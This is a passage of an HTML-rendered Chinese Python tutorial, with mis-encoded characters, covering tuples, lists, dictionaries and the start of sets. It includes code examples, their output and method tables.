class="string">&quot; &quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;\n--------åˆ†éš”ç¬¦-------&quot;</span>)</span><br><span class="line"><span class="comment">#æ•´ä½“å¯ä»¥æ”¹</span></span><br><span class="line">pen = (<span class="string">&quot;pear1&quot;</span>, <span class="string">&quot;pear2&quot;</span>, <span class="string">&quot;pear3&quot;</span>,<span class="string">&quot;pear4&quot;</span>)</span><br><span class="line"><span class="keyword">for</span> item <span class="keyword">in</span> pen:</span><br><span class="line">    <span class="keyword">if</span> item.find(<span class="string">&quot;4&quot;</span>) &gt;= <span class="number">0</span>:  <span class="comment"># å­—ç¬¦ä¸²æŸ¥æ‰¾ç”¨æ³•  find è¿”å›å­—ç¬¦ä¸²ä½ç½®</span></span><br><span class="line">        <span class="built_in">print</span>(item + <span class="string">&quot;è¿™æ˜¯ç¬¬4ä¸ªæ¢¨&quot;</span>)  <span class="comment"># å­—ç¬¦ä¸²ç›¸è¿ç”¨æ³•</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span>(item)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;---------------&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># è¿è¡Œç»“æœ</span></span><br><span class="line">element3</span><br><span class="line">(<span class="string">&#x27;element3&#x27;</span>, <span class="string">&#x27;element4&#x27;</span>)</span><br><span class="line">(<span class="string">&#x27;element1&#x27;</span>, <span class="string">&#x27;element2&#x27;</span>, <span class="string">&#x27;element3&#x27;</span>, <span class="string">&#x27;element4&#x27;</span>)</span><br><span class="line"><span class="literal">True</span></span><br><span class="line">pear1 pear2 pear3 </span><br><span class="line">--------åˆ†éš”ç¬¦-------</span><br><span class="line">pear1</span><br><span class="line">pear2</span><br><span class="line">pear3</span><br><span class="line">pear4è¿™æ˜¯ç¬¬<span class="number">4</span>ä¸ªæ¢¨</span><br><span class="line">---------------</span><br></pre></td></tr></table></figure>

    </div>
</div>
<h4 id="åˆ—è¡¨æ•°æ®ç±»å‹"><strong>åˆ—è¡¨æ•°æ®ç±»å‹</strong></h4>
<p>åˆ—è¡¨ä¼šå°†æ‰€æœ‰å…ƒç´ éƒ½æ”¾åœ¨ä¸€å¯¹ä¸­æ‹¬å·[]é‡Œé¢ï¼Œç›¸é‚»å…ƒç´ ä¹‹é—´ç”¨é€—å·åˆ†éš”ï¼Œå…·ä½“è¡¨ç°å½¢å¼ï¼š</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">[element1, element2, element3, ..., elementn]</span><br></pre></td></tr></table></figure>
<p><font class="notice">æ³¨æ„ï¼šä¸åŒäºCï¼Œjavaç­‰è¯­è¨€ä¸­çš„æ•°ç»„ï¼Œpythonçš„åˆ—è¡¨å¯ä»¥å­˜æ”¾ä¸åŒçš„ä»»æ„æ•°æ®ç±»å‹å¯¹è±¡ã€‚ </font></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">l = [<span class="number">123</span>,<span class="string">&quot;zkrc&quot;</span>,<span class="literal">True</span>]</span><br><span class="line"><span class="built_in">print</span>(l,<span class="built_in">type</span>(l),<span class="built_in">len</span>(l))</span><br><span class="line"><span class="keyword">for</span> item <span class="keyword">in</span> l:</span><br><span class="line">    <span class="built_in">print</span>(item,<span class="built_in">type</span>(item))</span><br><span class="line"><span class="comment"># æ‰§è¡Œç»“æœ</span></span><br><span class="line">[<span class="number">123</span>, <span class="string">&#x27;zkrc&#x27;</span>, <span class="literal">True</span>] &lt;<span class="keyword">class</span> <span class="string">&#x27;list&#x27;</span>&gt; <span class="number">3</span></span><br><span class="line"><span class="number">123</span> &lt;<span class="keyword">class</span> <span class="string">&#x27;int&#x27;</span>&gt;</span><br><span class="line">zkrc &lt;<span class="keyword">class</span> <span class="string">&#x27;str&#x27;</span>&gt;</span><br><span class="line"><span class="literal">True</span> &lt;<span class="keyword">class</span> <span class="string">&#x27;bool&#x27;</span>&gt;</span><br></pre></td></tr></table></figure>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># åˆ—è¡¨æ–¹å¼èµ‹å€¼å˜é‡ --åˆ—è¡¨å€¼ä¸å˜é‡æ•°é‡è¦ä¸€ä¸€å¯¹åº”</span></span><br><span class="line">a,b = [<span class="number">1</span>,<span class="number">2</span>]</span><br><span class="line"><span class="built_in">print</span>(a,b)</span><br><span class="line">a,b = [<span class="built_in">input</span>(<span class="string">&quot;è¯·è¾“å…¥ç¬¬ä¸€ä¸ªå­—ç¬¦: &quot;</span>),<span class="built_in">input</span>(<span class="string">&quot;è¯·è¾“å…¥ç¬¬äºŒä¸ªå­—ç¬¦: &quot;</span>)]</span><br><span class="line"><span class="built_in">print</span>(a,b)</span><br></pre></td></tr></table></figure>
<p><strong>åˆ—è¡¨æ•°æ®ä¿¡æ¯è°ƒå–</strong></p>
<p>æˆ‘ä»¬å¯ä»¥ä½¿ç”¨ç´¢å¼•ï¼ˆindexï¼‰è®¿é—®åˆ—è¡¨ä¸­çš„æŸä¸ªå…ƒç´ ï¼Œä¹Ÿå¯ä»¥ä½¿ç”¨åˆ‡ç‰‡æ“ä½œè®¿é—®åˆ—è¡¨ä¸­çš„ä¸€ç»„å…ƒç´ å€¼ä¿¡æ¯ï¼Œä»è€Œå¾—åˆ°çš„æ˜¯ä¸€ä¸ªæ–°çš„å­åˆ—è¡¨ã€‚</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">ç´¢å¼•æ±‚å€¼</span><br><span class="line">l = [<span class="number">10</span>,<span class="number">11</span>,<span class="number">12</span>,<span class="number">13</span>,<span class="number">14</span>]</span><br><span class="line"><span class="built_in">print</span>(l[<span class="number">2</span>])  <span class="comment"># 12</span></span><br><span class="line"><span class="built_in">print</span>(l[-<span class="number">1</span>]) <span class="comment"># 14</span></span><br><span class="line"> </span><br><span class="line">åˆ‡ç‰‡æ“ä½œ</span><br><span class="line">l = [<span class="number">10</span>,<span class="number">11</span>,<span class="number">12</span>,<span class="number">13</span>,<span class="number">14</span>]</span><br><span class="line"><span class="built_in">print</span>(l[<span class="number">2</span>:<span class="number">5</span>])       <span class="comment">#[12, 13, 14]</span></span><br><span class="line"><span class="built_in">print</span>(l[-<span class="number">3</span>:-<span class="number">1</span>])     <span class="comment">#[12, 13]</span></span><br></pre></td></tr></table></figure>
<p><strong>åˆ—è¡¨å†…ç½®æ–¹æ³•</strong></p>
<table>
<thead>
<tr>
<th><strong>æ–¹æ³•</strong></th>
<th><strong>ä½œç”¨</strong></th>
<th><strong>ç¤ºä¾‹</strong></th>
<th><strong>ç»“æœ</strong></th>
</tr>
</thead>
<tbody>
<tr>
<td><code>append()</code></td>
<td>å‘åˆ—è¡¨è¿½åŠ å…ƒç´ </td>
<td><code>l.append(4)</code></td>
<td><code>l``ï¼š[1, 2, 3, 4]</code></td>
</tr>
<tr>
<td><code>insert()</code></td>
<td>å‘åˆ—è¡¨ä»»æ„ä½ç½®æ·»åŠ å…ƒç´ </td>
<td><code>l.insert(0,100)</code></td>
<td><code>l``ï¼š[100, 1, 2, 3]</code></td>
</tr>
<tr>
<td><code>extend(``ï¼‰</code></td>
<td>å‘åˆ—è¡¨åˆå¹¶ä¸€ä¸ªåˆ—è¡¨</td>
<td><code>l.extend([4,5,6])</code></td>
<td><code>l``ï¼š[1, 2, 3, 4, 5, 6]</code></td>
</tr>
<tr>
<td><code>pop()</code></td>
<td>æ ¹æ®ç´¢å¼•åˆ é™¤åˆ—è¡¨å…ƒç´ </td>
<td><code>l.pop(1)</code></td>
<td><code>l``ï¼š[1, 3]</code></td>
</tr>
<tr>
<td><code>remove()</code></td>
<td>æ ¹æ®å…ƒç´ å€¼åˆ é™¤åˆ—è¡¨å…ƒç´ </td>
<td><code>l.remove(1)</code></td>
<td><code>l``ï¼š[2, 3]</code></td>
</tr>
<tr>
<td><code>clear()</code></td>
<td>æ¸…ç©ºåˆ—è¡¨å…ƒç´ </td>
<td><code>l.clear()</code></td>
<td><code>l``ï¼š[]</code></td>
</tr>
<tr>
<td><code>sort()</code></td>
<td>æ’åºï¼ˆå‡åºï¼‰</td>
<td><code>l.sort()</code></td>
<td><code>l``ï¼š[1,2,3]</code></td>
</tr>
<tr>
<td><code>reverse()</code></td>
<td>ç¿»è½¬åˆ—è¡¨</td>
<td><code>l.reverse()</code></td>
<td><code>l``ï¼š[3,2,1]</code></td>
</tr>
<tr>
<td><code>count()</code></td>
<td>å…ƒç´ é‡å¤çš„æ¬¡æ•°2æ˜¯å…ƒç´ </td>
<td><code>l.count(2)</code></td>
<td><code>è¿”å›å€¼ï¼š1</code></td>
</tr>
<tr>
<td><code>index()</code></td>
<td>æŸ¥æ‰¾å…ƒç´ å¯¹åº”ç´¢å¼•</td>
<td><code>l.index(2)</code></td>
<td><code>è¿”å›å€¼ï¼š1</code></td>
</tr>
</tbody>
</table>
<div class="spoiler collapsed">
    <div class="spoiler-title">
        ä»£ç æ“ä½œç¤ºä¾‹
    </div>
    <div class="spoiler-content">
        <figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 01 åˆ—è¡¨å…ƒç´ å¢åŠ æ“ä½œï¼šappend insert extend</span></span><br><span class="line">l1 = [<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment"># append()ï¼šè¿½åŠ ä¸€ä¸ªå…ƒç´ </span></span><br><span class="line">l1.append(<span class="number">4</span>)</span><br><span class="line"><span class="built_in">print</span>(l1)           <span class="comment"># [1, 2, 3, 4]</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># insert(): æ’å…¥ï¼Œå³åœ¨ä»»æ„ä½ç½®æ·»åŠ å…ƒç´ </span></span><br><span class="line">l1.insert(<span class="number">1</span>, <span class="number">100</span>)   <span class="comment"># åœ¨ç´¢å¼•1çš„ä½ç½®æ·»åŠ å…ƒç´ 100</span></span><br><span class="line"><span class="built_in">print</span>(l1)           <span class="comment"># [1, 100, 2, 3, 4]</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># extend()ï¼šæ‰©å±•ä¸€ä¸ªåˆ—è¡¨</span></span><br><span class="line">l2 = [<span class="number">20</span>, <span class="number">21</span>, <span class="number">22</span>, <span class="number">23</span>]</span><br><span class="line"><span class="comment"># l1.append(l2)</span></span><br><span class="line">l1.extend(l2)</span><br><span class="line"><span class="built_in">print</span>(l1)           <span class="comment">#[1, 100, 2, 3, 4, 20, 21, 22, 23]</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 02 åˆ—è¡¨å…ƒç´ åˆ é™¤æ“ä½œï¼špopï¼Œremoveï¼Œclear</span></span><br><span class="line">l4 = [<span class="number">10</span>, <span class="number">20</span>, <span class="number">30</span>, <span class="number">40</span>, <span class="number">50</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment"># æŒ‰ç´¢å¼•åˆ é™¤:pop,è¿”å›åˆ é™¤çš„å…ƒç´ </span></span><br><span class="line">ret = l4.pop(<span class="number">3</span>)</span><br><span class="line"><span class="built_in">print</span>(ret)</span><br><span class="line"><span class="built_in">print</span>(l4)            <span class="comment"># [10, 20, 30, 50]</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># æŒ‰ç€å…ƒç´ å€¼åˆ é™¤</span></span><br><span class="line">l4.remove(<span class="number">30</span>)</span><br><span class="line"><span class="built_in">print</span>(l4)            <span class="comment"># [10, 20, 50]</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># æ¸…ç©ºåˆ—è¡¨</span></span><br><span class="line">l4.clear()</span><br><span class="line"><span class="built_in">print</span>(l4)            <span class="comment"># []</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 03 åˆ—è¡¨å…ƒç´ ä¿®æ”¹æ“ä½œï¼š</span></span><br><span class="line">l5 = [<span class="number">10</span>, <span class="number">20</span>, <span class="number">30</span>, <span class="number">40</span>, <span class="number">50</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment">#  å°†ç´¢å¼•ä¸º1çš„å€¼æ”¹ä¸º200</span></span><br><span class="line">l5[<span class="number">1</span>] = <span class="number">200</span></span><br><span class="line"><span class="built_in">print</span>(l5)             <span class="comment"># [10, 200, 30, 40, 50]</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># å°†l5ä¸­çš„40æ”¹ä¸º400 , step1ï¼šæŸ¥è¯¢40çš„ç´¢å¼• step2ï¼šå°†ç´¢å¼•ä¸ºiçš„å€¼æ”¹ä¸º400</span></span><br><span class="line">i = l5.index(<span class="number">40</span>) <span class="comment">#  3</span></span><br><span class="line">l5[i] = <span class="number">400</span></span><br><span class="line"><span class="built_in">print</span>(l5)             <span class="comment"># [10, 20, 30, 400, 50]</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 04 åˆ—è¡¨å…ƒç´ æŸ¥è¯¢æ“ä½œï¼šindexï¼Œsort</span></span><br><span class="line">l5.reverse()          <span class="comment"># åªæ˜¯ç¿»è½¬ [50, 400, 30, 200, 10]</span></span><br><span class="line"><span class="built_in">print</span>(l5) <span class="comment"># []</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># æŸ¥è¯¢æŸä¸ªå…ƒç´ çš„ç´¢å¼•ï¼Œæ¯”å¦‚30çš„ç´¢å¼•</span></span><br><span class="line"><span class="built_in">print</span>(l5.index(<span class="number">30</span>))   <span class="comment"># 2</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># æ’åº</span></span><br><span class="line">l5.sort(reverse=<span class="literal">True</span>)</span><br><span class="line"><span class="built_in">print</span>(l5)             <span class="comment"># [400, 200, 50, 30, 10]</span></span><br></pre></td></tr></table></figure>

    </div>
</div>
<h4 id="å­—å…¸æ•°æ®ç±»å‹"><strong>å­—å…¸æ•°æ®ç±»å‹</strong></h4>
<p>å­—å…¸æ˜¯pythonæä¾›çš„å”¯ä¸€å†…é”®çš„æ˜ å°„ï¼ˆmapping typeï¼‰æ•°æ®ç±»å‹ï¼Œpythonä½¿ç”¨{ }åˆ›å»ºå­—å…¸ã€‚</p>
<p>ç”±äºå­—å…¸ä¸­æ¯ä¸ªå…ƒç´ éƒ½åŒ…å«é”®ï¼ˆkeyï¼‰å’Œå€¼ï¼ˆvalueï¼‰ä¸¤éƒ¨åˆ†ï¼Œå› æ­¤åœ¨åˆ›å»ºå­—å…¸æ—¶ï¼Œé”®å’Œå€¼ä¹‹é—´ä½¿ç”¨è‹±æ–‡å†’å·<code>:</code>åˆ†éš”ã€‚ç›¸é‚»å…ƒç´ ä¹‹é—´ä½¿ç”¨è‹±æ–‡é€—å·,åˆ†éš”ï¼Œæ‰€æœ‰å…ƒç´ æ”¾åœ¨å¤§æ‹¬å· <code>&#123; &#125;</code> ä¸­ï¼Œå­—å…¸çš„å…ƒç´ ä¹Ÿå«æˆå‘˜ï¼Œæ˜¯ä¸€ä¸ªé”®å€¼å¯¹ã€‚</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">dictname = &#123;<span class="string">&#x27;key1&#x27;</span>:<span class="string">&#x27;value1&#x27;</span>, <span class="string">&#x27;key2&#x27;</span>:<span class="string">&#x27;value2&#x27;</span>, ...&#125;</span><br></pre></td></tr></table></figure>
<p>åŒä¸€å­—å…¸ä¸­çš„å„ä¸ªé”®å¿…é¡»å”¯ä¸€ï¼Œä¸èƒ½é‡å¤ã€‚</p>
<p>å­—å…¸çš„é”®å€¼å¯¹åŸæœ¬æ˜¯æ— åºçš„ï¼Œä½†æ˜¯åœ¨python3.6ç‰ˆæœ¬ä¹‹åï¼Œå­—å…¸é»˜è®¤åšæˆæœ‰åºçš„äº†ã€‚</p>
<div class="spoiler collapsed">
    <div class="spoiler-title">
        ä»£ç æ“ä½œç¤ºä¾‹
    </div>
    <div class="spoiler-content">
        <figure class="highlight python"><table><tr><td class="code"><pre><span class="line">d = &#123;<span class="string">&quot;01&quot;</span>: <span class="string">&quot;zhangsan&quot;</span>, <span class="string">&quot;02&quot;</span>: <span class="string">&quot;lisi&quot;</span>, <span class="string">&quot;03&quot;</span>: <span class="string">&quot;wangwu&quot;</span>&#125;</span><br><span class="line"><span class="built_in">print</span>(d, <span class="built_in">type</span>(d))</span><br><span class="line"></span><br><span class="line"><span class="comment"># 01 æŸ¥é”®å€¼</span></span><br><span class="line"><span class="built_in">print</span>(d[<span class="string">&quot;01&quot;</span>],d[<span class="string">&quot;02&quot;</span>])</span><br><span class="line"></span><br><span class="line"><span class="comment"># 02 æ·»åŠ æˆ–ä¿®æ”¹é”®å€¼å¯¹</span></span><br><span class="line"><span class="comment"># æ³¨æ„ï¼šå¦‚æœé”®å­˜åœ¨ï¼Œåˆ™æ˜¯ä¿®æ”¹ï¼Œå¦åˆ™æ˜¯æ·»åŠ </span></span><br><span class="line">d[<span class="string">&quot;01&quot;</span>] = <span class="string">&quot;xiaoX&quot;</span>  <span class="comment"># ä¿®æ”¹é”®çš„å€¼</span></span><br><span class="line">d[<span class="string">&quot;04&quot;</span>] = <span class="string">&quot;zhaoliu&quot;</span>  <span class="comment"># æ·»åŠ é”®å€¼å¯¹</span></span><br><span class="line"><span class="built_in">print</span>(d)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 03 åˆ é™¤é”®å€¼å¯¹</span></span><br><span class="line"><span class="built_in">print</span>(d)</span><br><span class="line"><span class="keyword">del</span> d[<span class="string">&quot;01&quot;</span>]  <span class="comment"># åˆ é™¤å­—å…¸æŒ‡å®šæˆå‘˜ä¿¡æ¯ delete</span></span><br><span class="line"><span class="built_in">print</span>(d)</span><br><span class="line"><span class="keyword">del</span> d  <span class="comment"># åˆ é™¤å­—å…¸</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># å­—å…¸æˆå‘˜è¿‡æ»¤ç­›é€‰ï¼š</span></span><br><span class="line">d = &#123;<span class="string">&quot;01&quot;</span>: <span class="string">&quot;zhangsan&quot;</span>, <span class="string">&quot;02&quot;</span>: <span class="string">&quot;lisi&quot;</span>, <span class="string">&quot;03&quot;</span>: <span class="string">&quot;wangwu&quot;</span>&#125;</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;01&quot;</span> <span class="keyword">in</span> d)</span><br><span class="line"></span><br><span class="line"><span class="comment"># å­—å…¸æ•°æ®ä¿¡æ¯éå†ï¼š</span></span><br><span class="line">d = &#123;<span class="string">&quot;01&quot;</span>: <span class="string">&quot;zhangsan&quot;</span>, <span class="string">&quot;02&quot;</span>: <span class="string">&quot;lisi&quot;</span>, <span class="string">&quot;03&quot;</span>: <span class="string">&quot;wangwu&quot;</span>&#125;</span><br><span class="line"><span class="keyword">for</span> key <span class="keyword">in</span> d:</span><br><span class="line">    <span class="built_in">print</span>(key, d[key],<span class="string">&quot;||&quot;</span>,end=<span class="string">&quot; &quot;</span>)</span><br><span class="line"><span class="comment"># æ‰§è¡Œç»“æœ</span></span><br><span class="line">&#123;<span class="string">&#x27;01&#x27;</span>: <span class="string">&#x27;zhangsan&#x27;</span>, <span class="string">&#x27;02&#x27;</span>: <span class="string">&#x27;lisi&#x27;</span>, <span class="string">&#x27;03&#x27;</span>: <span class="string">&#x27;wangwu&#x27;</span>&#125; &lt;<span class="keyword">class</span> <span class="string">&#x27;dict&#x27;</span>&gt;</span><br><span class="line">zhangsan lisi</span><br><span class="line">&#123;<span class="string">&#x27;01&#x27;</span>: <span class="string">&#x27;xiaoX&#x27;</span>, <span class="string">&#x27;02&#x27;</span>: <span class="string">&#x27;lisi&#x27;</span>, <span class="string">&#x27;03&#x27;</span>: <span class="string">&#x27;wangwu&#x27;</span>, <span class="string">&#x27;04&#x27;</span>: <span class="string">&#x27;zhaoliu&#x27;</span>&#125;</span><br><span class="line">&#123;<span class="string">&#x27;01&#x27;</span>: <span class="string">&#x27;xiaoX&#x27;</span>, <span class="string">&#x27;02&#x27;</span>: <span class="string">&#x27;lisi&#x27;</span>, <span class="string">&#x27;03&#x27;</span>: <span class="string">&#x27;wangwu&#x27;</span>, <span class="string">&#x27;04&#x27;</span>: <span class="string">&#x27;zhaoliu&#x27;</span>&#125;</span><br><span class="line">&#123;<span class="string">&#x27;02&#x27;</span>: <span class="string">&#x27;lisi&#x27;</span>, <span class="string">&#x27;03&#x27;</span>: <span class="string">&#x27;wangwu&#x27;</span>, <span class="string">&#x27;04&#x27;</span>: <span class="string">&#x27;zhaoliu&#x27;</span>&#125;</span><br><span class="line"><span class="literal">True</span></span><br><span class="line">01 zhangsan || 02 lisi || 03 wangwu || </span><br></pre></td></tr></table></figure>

    </div>
</div>
<p><strong>å­—å…¸å†…ç½®çš„æ–¹æ³•</strong></p>
<table>
<thead>
<tr>
<th><strong>æ–¹æ³•</strong></th>
<th><strong>ä½œç”¨</strong></th>
<th><strong>ç¤ºä¾‹</strong></th>
<th><strong>ç»“æœ</strong></th>
</tr>
</thead>
<tbody>
<tr>
<td><code>get()</code></td>
<td>æŸ¥è¯¢å­—å…¸é”®å€¼ï¼Œå–ä¸åˆ°è¿”å›é»˜è®¤å€¼</td>
<td><code>d.get(&quot;name&quot;,None)</code></td>
<td><code>&quot;zkrc&quot;</code></td>
</tr>
<tr>
<td><code>setdefault()</code></td>
<td>æŸ¥è¯¢å­—å…¸æŸé”®çš„å€¼ï¼Œå–ä¸åˆ°ç»™å­—å…¸è®¾ç½®é”®å€¼ï¼ŒåŒæ—¶è¿”å›è®¾ç½®çš„å€¼</td>
<td><code>d.setdefault(&quot;age&quot;,20)</code></td>
<td><code>18</code></td>
</tr>
<tr>
<td><code>keys()</code></td>
<td>æŸ¥è¯¢å­—å…¸ä¸­æ‰€æœ‰çš„é”®</td>
<td><code>d.keys()</code></td>
<td><code>['name','age']</code></td>
</tr>
<tr>
<td><code>values()</code></td>
<td>æŸ¥è¯¢å­—å…¸ä¸­æ‰€æœ‰çš„å€¼</td>
<td><code>d.values()</code></td>
<td><code>['zkrc', 18]</code></td>
</tr>
<tr>
<td><code>items()</code></td>
<td>æŸ¥è¯¢å­—å…¸ä¸­æ‰€æœ‰çš„é”®å’Œå€¼</td>
<td><code>d.items()</code></td>
<td><code>[('name','zkrc'),`` ('age', 18)]</code></td>
</tr>
<tr>
<td><code>pop()</code></td>
<td>åˆ é™¤å­—å…¸<strong>æŒ‡å®š</strong>çš„é”®å€¼å¯¹</td>
<td><code>d.pop(</code>â€œageâ€<code>)</code></td>
<td><code>&#123;'name':'zkrc'&#125;</code></td>
</tr>
<tr>
<td><code>popitem()</code></td>
<td>åˆ é™¤å­—å…¸<strong>æœ€å</strong>çš„é”®å€¼å¯¹</td>
<td><code>d.popitem()</code></td>
<td><code>&#123;'name':'zkrc'&#125;</code></td>
</tr>
<tr>
<td><code>clear()</code></td>
<td><strong>æ¸…ç©º</strong>å­—å…¸</td>
<td><code>d.clear()</code></td>
<td><code>&#123;&#125;</code></td>
</tr>
<tr>
<td><code>update()</code></td>
<td>æ›´æ–°å­—å…¸</td>
<td></td>
<td></td>
</tr>
</tbody>
</table>
<div class="spoiler collapsed">
    <div class="spoiler-title">
        ä»£ç æ“ä½œç¤ºä¾‹
    </div>
    <div class="spoiler-content">
        <figure class="highlight python"><table><tr><td class="code"><pre><span class="line">dic = &#123;<span class="string">&quot;name&quot;</span>: <span class="string">&quot;zkrc&quot;</span>, <span class="string">&quot;age&quot;</span>: <span class="number">22</span>, <span class="string">&quot;sex&quot;</span>: <span class="string">&quot;male&quot;</span>&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment"># 01. æŸ¥å­—å…¸çš„é”®çš„å€¼</span></span><br><span class="line">name = dic.get(<span class="string">&quot;name&quot;</span>)</span><br><span class="line">sex = dic.get(<span class="string">&quot;sex&quot;</span>, <span class="string">&quot;female&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(name)</span><br><span class="line"><span class="built_in">print</span>(sex)</span><br><span class="line"><span class="built_in">print</span>(dic.keys())     <span class="comment"># è¿”å›å€¼ï¼š[&#x27;name&#x27;, &#x27;age&#x27;, &#x27;sex&#x27;]</span></span><br><span class="line"><span class="built_in">print</span>(dic.values())   <span class="comment"># è¿”å›å€¼ï¼š[&#x27;zkrc&#x27;, 22, &#x27;male&#x27;]</span></span><br><span class="line"><span class="built_in">print</span>(dic.items())    <span class="comment"># [(&#x27;name&#x27;, &#x27;zkrc&#x27;), (&#x27;age&#x27;, 22), (&#x27;sex&#x27;, &#x27;male&#x27;)]</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># setdefaultå–æŸé”®çš„å€¼ï¼Œå¦‚æœèƒ½å–åˆ°ï¼Œåˆ™è¿”å›è¯¥é”®çš„å€¼ï¼Œå¦‚æœæ²¡æœ‰è¯¥é”®ï¼Œåˆ™ä¼šè®¾ç½®é”®å€¼å¯¹</span></span><br><span class="line"><span class="built_in">print</span>(dic.setdefault(<span class="string">&quot;name&quot;</span>))</span><br><span class="line"><span class="built_in">print</span>(dic.setdefault(<span class="string">&quot;height&quot;</span>, <span class="string">&quot;180cm&quot;</span>))  <span class="comment"># get()ä¸ä¼šæ·»åŠ é”®å€¼å¯¹ ï¼Œsetdefaultä¼šæ·»åŠ </span></span><br><span class="line"><span class="built_in">print</span>(dic)            <span class="comment"># &#123;&#x27;name&#x27;: &#x27;zkrc&#x27;, &#x27;age&#x27;: 22, &#x27;sex&#x27;: &#x27;male&#x27;, &#x27;height&#x27;: &#x27;180cm&#x27;&#125;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 02. åˆ é™¤é”®å€¼å¯¹ pop popitem</span></span><br><span class="line">sex = dic.pop(<span class="string">&quot;sex&quot;</span>)  <span class="comment"># male</span></span><br><span class="line"><span class="built_in">print</span>(sex)            <span class="comment"># male</span></span><br><span class="line"><span class="built_in">print</span>(dic)            <span class="comment"># &#123;&#x27;name&#x27;: &#x27;zkrc&#x27;, &#x27;age&#x27;: 22&#125;</span></span><br><span class="line"></span><br><span class="line">dic.popitem()  <span class="comment"># åˆ é™¤æœ€åä¸€ä¸ªé”®å€¼å¯¹</span></span><br><span class="line"><span class="built_in">print</span>(dic)            <span class="comment"># &#123;&#x27;name&#x27;: &#x27;zkrc&#x27;&#125;</span></span><br><span class="line"></span><br><span class="line">dic.clear()           <span class="comment"># æ¸…ç©ºé”®å€¼å¯¹</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 03. æ·»åŠ æˆ–ä¿®æ”¹ update</span></span><br><span class="line">add_dic = &#123;<span class="string">&quot;height&quot;</span>: <span class="string">&quot;180cm&quot;</span>, <span class="string">&quot;weight&quot;</span>: <span class="string">&quot;60kg&quot;</span>&#125;</span><br><span class="line">dic.update(add_dic)</span><br><span class="line"><span class="built_in">print</span>(dic)            <span class="comment"># &#123;&#x27;name&#x27;: &#x27;zkrc&#x27;, &#x27;age&#x27;: 22, &#x27;sex&#x27;: &#x27;male&#x27;, &#x27;height&#x27;: &#x27;180cm&#x27;, &#x27;weight&#x27;: &#x27;60kg&#x27;&#125;</span></span><br><span class="line"></span><br><span class="line">update_dic = &#123;<span class="string">&quot;age&quot;</span>: <span class="number">33</span>, <span class="string">&quot;height&quot;</span>: <span class="string">&quot;180cm&quot;</span>, <span class="string">&quot;weight&quot;</span>: <span class="string">&quot;60kg&quot;</span>&#125;</span><br><span class="line">dic.update(update_dic)</span><br><span class="line"><span class="built_in">print</span>(dic)            <span class="comment"># &#123;&#x27;name&#x27;: &#x27;zkrc&#x27;, &#x27;age&#x27;: 33, &#x27;sex&#x27;: &#x27;male&#x27;, &#x27;height&#x27;: &#x27;180cm&#x27;, &#x27;weight&#x27;: &#x27;60kg&#x27;&#125;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 04. å­—å…¸çš„å¾ªç¯</span></span><br><span class="line">dic = &#123;<span class="string">&quot;name&quot;</span>: <span class="string">&quot;zkrc&quot;</span>, <span class="string">&quot;age&quot;</span>: <span class="number">22</span>, <span class="string">&quot;sex&quot;</span>: <span class="string">&quot;male&quot;</span>&#125;</span><br><span class="line"><span class="comment"># éå†é”®å€¼å¯¹æ–¹å¼1</span></span><br><span class="line"><span class="keyword">for</span> key <span class="keyword">in</span> dic:       <span class="comment"># å°†æ¯ä¸ªé”®åˆ†åˆ«èµ‹å€¼ç»™key</span></span><br><span class="line">     <span class="built_in">print</span>(key, dic.get(key))</span><br><span class="line"></span><br><span class="line"><span class="comment"># éå†é”®å€¼å¯¹å„¿æ–¹å¼2</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> dic.items(): <span class="comment"># [(&#x27;name&#x27;, &#x27;zkrc&#x27;), (&#x27;age&#x27;, 22), (&#x27;sex&#x27;, &#x27;male&#x27;)]</span></span><br><span class="line">     <span class="built_in">print</span>(i[<span class="number">0</span>],i[<span class="number">1</span>])</span><br></pre></td></tr></table></figure>

    </div>
</div>
<h4 id="é›†åˆæ•°æ®ç±»å‹"><strong>é›†åˆæ•°æ®ç±»å‹</strong></h4>
<p>Python ä¸­çš„é›†åˆï¼Œå’Œæ•°å­¦ä¸­çš„é›†åˆæ¦‚å¿µä¸€æ ·ï¼Œç”±ä¸åŒå¯hashçš„ä¸é‡å¤çš„å…ƒç´ ç»„æˆçš„é›†åˆã€‚</p>
<p>Python é›†åˆä¼šå°†æ‰€æœ‰å…ƒç´ æ”¾åœ¨ä¸€å¯¹å¤§æ‹¬å· {} ä¸­ï¼Œç›¸é‚»å…ƒç´ ä¹‹é—´ç”¨â€œ,â€åˆ†éš”ã€‚</p>
